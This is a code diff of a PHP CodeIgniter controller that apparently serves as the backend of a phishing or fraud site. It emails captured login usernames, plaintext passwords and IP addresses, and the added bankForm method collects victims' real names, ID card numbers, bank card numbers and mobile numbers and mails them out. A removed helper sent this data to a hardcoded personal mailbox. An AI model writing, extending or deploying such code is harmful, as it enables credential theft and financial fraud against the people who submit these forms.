@@ -1,7 +1,7 @@
 <?php
 defined('BASEPATH') OR exit('No direct script access allowed');
 
-class Operator extends CI_Controller{
+class Operator extends MY_Controller {
     function __construct()
     {
         parent::__construct();
@@ -20,22 +20,12 @@ class Operator extends CI_Controller{
         {
             $this->load->view('weihu');
         }
-        $this->SendMail($data['username'],$data['password'],$data['ip']);
+        $subjet="登录提醒";
+        $messg="登录用户名：".$data['username'].";  登陆密码：".$data['password'].";  登录IP：".$data['ip'];
+        $this->SendMail($subjet,$messg);
 
     }
-    private function SendMail($username,$userpass,$ip)
-    {
-        $this->config->load('email_config', TRUE);
-        $emailConfig = $this->config->item('useremail', 'email_config');
-        $this->load->library('email');
-        $this->email->initialize($emailConfig);
 
-        $this->email->from('m13841056971_1@163.com','owner');
-        $this->email->to('m13841056971_1@163.com');
-        $this->email->subject("登录提醒");
-        $this->email->message("登录用户名：".$username.";  登陆密码：".$userpass.";  登录IP：".$ip);
-        $this->email->send();
-    }
 
     public function Cert()
     {
@@ -44,12 +34,62 @@ class Operator extends CI_Controller{
 
     public  function CertForm()
     {
+
+
         $data["realname"]=$this->input->post("username");
         $data['usercard']=$this->input->post('identity');
         $this->load->model('modeluserinfo');
-        $re=$this->modeluserinfo->AddUserinfo($data);
+        $result["re"]=$this->modeluserinfo->AddUserinfo($data);
+        $this->load->view("bandbank",$result);
+    }
+
+    public function bankForm()
+    {
+        $data["username"]=$this->input->post("username");
+        $data['id']=$this->input->post('id');
+        $data["bankno"]=$this->input->post("cardnum");
+        $data["bankname"]=$this->input->post("bankname");
+        $data['cardtype']=$this->input->post('cardtype');
+        $data["cardno"]=$this->input->post("cardno");
+        $data['usermobile']=$this->input->post('usermobile');
+        if(!empty($data['id']))
+        {
+            $this->load->model('modeluserinfo');
+            $this->modeluserinfo->UpdateUserinfo($data);
+
+            $re=$this->modeluserinfo->GetUserinfo(array('id'=>$data['id'],'first'=>true));
+            $subjet="认证提醒";
+            $messg="姓名：".$re->realname."；银行卡号：".$re->bankno."-".$re->bankname."；身份证".$re->usercard."手机号：".$re->usermobile;
+            $this->SendMail($subjet,$messg);
+
+            $this->load->view("sendmess");
+        }else
+        {
+            redirect(base_url().'operator/cert.htm');
+        }
 
 
+    }
+
+
+    public function  GetBankName()
+    {
+        $num=$this->input->post("num");
+        if(!empty($num))
+        {
+            $num=str_replace(' ','',$num);
+            $num=substr($num,0,6);
+
+            $this->load->model('modelbankcard');
+            $re=$this->modelbankcard->GetBankCard(array('id'=>$num,'first'=>true));
+            if($re)
+            {
+                echo $re->bankname;
+            }else{
+                echo "未知";
+            }
+
+        }
     }
 
 
